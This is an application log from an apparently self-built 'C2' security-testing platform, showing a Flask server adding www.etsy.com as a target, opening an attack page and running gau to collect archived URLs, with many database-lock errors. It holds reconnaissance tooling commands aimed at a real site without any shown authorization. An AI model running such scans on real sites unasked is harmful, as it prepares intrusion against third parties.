
🔒 C2 安全測試平台權限提升
==================================================
為了獲得最佳掃描性能，建議以 root 權限運行：
• TCP SYN 掃描 (更快、更隱蔽)
• 完整的網絡功能
• 高級掃描選項

如果拒絕，將使用 TCP Connect 掃描 (較慢但無需權限)

是否要求 sudo 權限？[Y/n]: ⚠️  繼續以普通用戶權限運行
👤 當前權限: 普通用戶
🐌 掃描模式: TCP Connect (標準)

使用數據庫管理模塊解鎖數據庫: /home/hacker/Desktop/C2/instance/c2.db
未發現鎖文件
2025-06-05 16:47:24 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 16:47:24 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 16:47:24 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 16:47:24 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 16:47:24 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 16:47:24 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 16:47:24 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-05 16:47:24 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 16:47:24 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
 * Serving Flask app 'app.app'
 * Debug mode: on
2025-06-05 16:47:24 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-05 16:47:24 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-05 16:47:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:47:35] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:47:41 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=5, providers=['wayback', 'commoncrawl', 'otx'], exclude_extensions=[], blacklist=png,jpg,gif,test
2025-06-05 16:47:41 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=5, providers=['wayback', 'commoncrawl', 'otx'], exclude_extensions=[], blacklist=png,jpg,gif,test
2025-06-05 16:47:41 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 16:47:41 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 16:47:46 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.OperationalError) database is locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 16:47:41.440112')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 16:47:46 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.OperationalError) database is locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 16:47:41.440112')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 16:47:46 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 16:47:46 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 16:47:51 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.OperationalError) database is locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 16:47:46.949431')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 16:47:51 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.OperationalError) database is locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 16:47:46.949431')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 16:47:52 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 16:47:52 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 16:47:57 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.OperationalError) database is locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 16:47:52.957722')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 16:47:57 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.OperationalError) database is locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 16:47:52.957722')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 16:47:57 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.OperationalError) database is locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 16:47:52.957722')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 16:47:57 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.OperationalError) database is locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 16:47:52.957722')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 16:47:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:47:57] "[35m[1mPOST /api/gau/scan/1 HTTP/1.1[0m" 503 -
locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 16:47:52.957722')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 16:47:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:47:57] "[35m[1mPOST /api/gau/scan/1 HTTP/1.1[0m" 503 -
2025-06-05 16:48:24 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 16:48:24 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 16:48:24 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 16:48:24 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 16:48:24 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 16:48:24 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 16:48:24 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 16:48:24 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 16:48:24 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-05 16:48:24 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 16:48:24 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 16:48:24 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-05 16:48:24 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-05 16:48:31 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 16:48:31 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 16:48:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:48:31] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-05 16:48:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:48:31] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-05 16:48:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:48:31] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:48:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:48:31] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:48:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:48:31] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 16:48:31 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:48:31 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:48:31 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:48:31 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:48:31 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:48:31 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:48:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:48:31] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 16:48:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:48:33] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:48:33 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:48:33 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:48:33 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:48:33 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:48:33 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:48:33 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:48:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:48:33] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 16:48:35 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 16:48:35 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 16:48:35 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 16:48:35 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 16:48:40 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.OperationalError) database is locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 16:48:35.733134')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 16:48:40 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.OperationalError) database is locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 16:48:35.733134')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 16:48:41 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 16:48:41 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 16:48:46 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.OperationalError) database is locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 16:48:41.240343')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 16:48:46 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.OperationalError) database is locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 16:48:41.240343')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 16:48:47 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 16:48:47 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 16:48:58 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 16:48:58 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 16:48:58 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 16:48:58 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 16:48:58 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 16:48:58 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 16:48:58 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 16:48:58 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 16:48:58 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-05 16:48:58 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 16:48:58 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 16:48:58 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-05 16:48:58 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-05 16:49:21 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 16:49:21 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 16:49:21 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 16:49:21 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 16:49:21 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 16:49:21 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 16:49:21 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 16:49:21 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 16:49:21 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-05 16:49:21 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 16:49:21 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 16:49:21 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 16:49:21 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 16:49:21 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 16:49:21 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 16:49:21 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 16:49:21 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 16:49:21 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 16:49:21 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 16:49:21 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-05 16:49:21 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 16:49:21 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 16:49:22 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-05 16:49:22 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-05 16:49:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:28] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:49:29 | ERROR    | attack_route.py:20 | attack() | 加载扫描界面时出错: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
2025-06-05 16:49:29 | ERROR    | attack_route.py:20 | attack() | 加载扫描界面时出错: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
2025-06-05 16:49:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:29] "[35m[1mGET /attack/1 HTTP/1.1[0m" 500 -
2025-06-05 16:49:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:29] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:49:35 | INFO     | config.py:205 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 16:49:35 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-05 16:49:35 | INFO     | index_routes.py:17 | index() | 查詢到 0 個目標
2025-06-05 16:49:35 | INFO     | config.py:210 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.009s)
2025-06-05 16:49:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:35] "GET / HTTP/1.1" 200 -
2025-06-05 16:49:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:37] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:49:38 | INFO     | config.py:205 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 16:49:38 | INFO     | config.py:210 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.001s)
2025-06-05 16:49:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:38] "GET /add_target HTTP/1.1" 200 -
2025-06-05 16:49:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:38] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:49:43 | INFO     | config.py:205 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 16:49:43 | INFO     | index_routes.py:47 | add_target() | 收到添加目標請求: domain='www.etsy.com', target_ip='https://www.etsy.com/'
2025-06-05 16:49:43 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.etsy.com/, domain=www.etsy.com
2025-06-05 16:49:43 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.etsy.com/, domain=www.etsy.com
2025-06-05 16:49:43 | INFO     | index_routes.py:83 | add_target() | ✅ 成功添加目標: ID=1, target_ip=https://www.etsy.com/
2025-06-05 16:49:43 | INFO     | index_routes.py:83 | add_target() | ✅ 成功添加目標: ID=1, target_ip=https://www.etsy.com/
2025-06-05 16:49:43 | INFO     | index_routes.py:84 | add_target() | 目標添加成功: ID=1
2025-06-05 16:49:43 | INFO     | config.py:210 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.006s)
2025-06-05 16:49:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:43] "[32mPOST /add_target HTTP/1.1[0m" 302 -
2025-06-05 16:49:43 | INFO     | config.py:205 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 16:49:43 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-05 16:49:43 | INFO     | index_routes.py:17 | index() | 查詢到 1 個目標
2025-06-05 16:49:43 | INFO     | config.py:210 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.001s)
2025-06-05 16:49:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:43] "GET / HTTP/1.1" 200 -
2025-06-05 16:49:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:43] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:49:44 | INFO     | attack_route.py:16 | attack() | 加载扫描界面，目标ID: 1
2025-06-05 16:49:44 | INFO     | attack_route.py:16 | attack() | 加载扫描界面，目标ID: 1
2025-06-05 16:49:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:44] "GET /attack/1 HTTP/1.1" 200 -
2025-06-05 16:49:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:44] "[36mGET /static/css/attack.css HTTP/1.1[0m" 304 -
2025-06-05 16:49:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:44] "[36mGET /static/js/dist/bundle.js HTTP/1.1[0m" 304 -
2025-06-05 16:49:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:44] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:49:46 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 16:49:46 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 16:49:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:46] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-05 16:49:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:46] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-05 16:49:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:46] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:49:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:46] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 16:49:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:46] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:49:48 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 16:49:48 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 16:49:48 | INFO     | Gau_route.py:111 | gau_scan() | 创建新的扫描记录: target_id=1, domain=www.etsy.com
2025-06-05 16:49:48 | INFO     | Gau_route.py:111 | gau_scan() | 创建新的扫描记录: target_id=1, domain=www.etsy.com
2025-06-05 16:49:48 | INFO     | Gau_route.py:154 | gau_scan() | Final scan options: {'threads': 50, 'providers': 'wayback,commoncrawl,otx,urlscan', 'blacklist': 'ttf,woff,svg,png,jpg,gif,jpeg,ico', 'verbose': False}
2025-06-05 16:49:48 | INFO     | Gau_route.py:154 | gau_scan() | Final scan options: {'threads': 50, 'providers': 'wayback,commoncrawl,otx,urlscan', 'blacklist': 'ttf,woff,svg,png,jpg,gif,jpeg,ico', 'verbose': False}
2025-06-05 16:49:48 | INFO     | thread_gau.py:482 | start_gau_scan() | 已启动Gau扫描，目标ID: 1
2025-06-05 16:49:48 | INFO     | thread_gau.py:255 | _execute_gau_scan() | 执行命令: /home/hacker/Desktop/C2/tools/gau_linux/gau www.etsy.com --o /home/hacker/Desktop/C2/output/gau/gau_1_1749113388.txt --threads 50 --providers wayback,commoncrawl,otx,urlscan --blacklist ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 16:49:48 | INFO     | thread_gau.py:482 | start_gau_scan() | 已启动Gau扫描，目标ID: 1
2025-06-05 16:49:48 | INFO     | thread_gau.py:255 | _execute_gau_scan() | 执行命令: /home/hacker/Desktop/C2/tools/gau_linux/gau www.etsy.com --o /home/hacker/Desktop/C2/output/gau/gau_1_1749113388.txt --threads 50 --providers wayback,commoncrawl,otx,urlscan --blacklist ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 16:49:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:48] "POST /api/gau/scan/1 HTTP/1.1" 200 -
2025-06-05 16:49:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:51] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:49:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:55] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:49:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:49:58] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:01] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:02] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:50:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:04] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:07] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:10] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:10] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:50:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:13] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:16] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:19] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:22] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:25] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:28] "GET /api/gau/status/1 HTTP/1.1" 200 -
